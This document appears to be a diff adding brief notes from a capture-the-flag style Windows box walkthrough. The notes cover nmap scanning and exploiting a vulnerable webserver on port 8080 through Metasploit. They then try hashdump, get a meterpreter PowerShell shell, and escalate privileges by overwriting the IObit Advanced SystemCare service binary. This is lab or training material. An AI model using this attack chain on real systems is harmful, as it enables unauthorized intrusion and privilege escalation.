@@ -1,0 +1,29 @@
+
+nmap
+
+Take a look at the website on port 80
+
+There's another webserver running on port 8080
+running a vulnerable webserver 
+
+CVE-2014- Look it up on the exploit database
+
+search the CVE in metasploit msfconsole
+
+set RHOST RPORT 8080
+set LHOST LPORT
+run
+
+try hashdump..no dice
+
+shell and powershell work, but better to load powershell and powershell_shell from meterpreter. 
+ALT: shell gives us Windows cmd and that will load powershell but that seems to often crash the remote system.
+
+
+
+AdvancedSystemCareService9
+
+
+
+We need to overwrite the following file and then restart.
+'C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe'
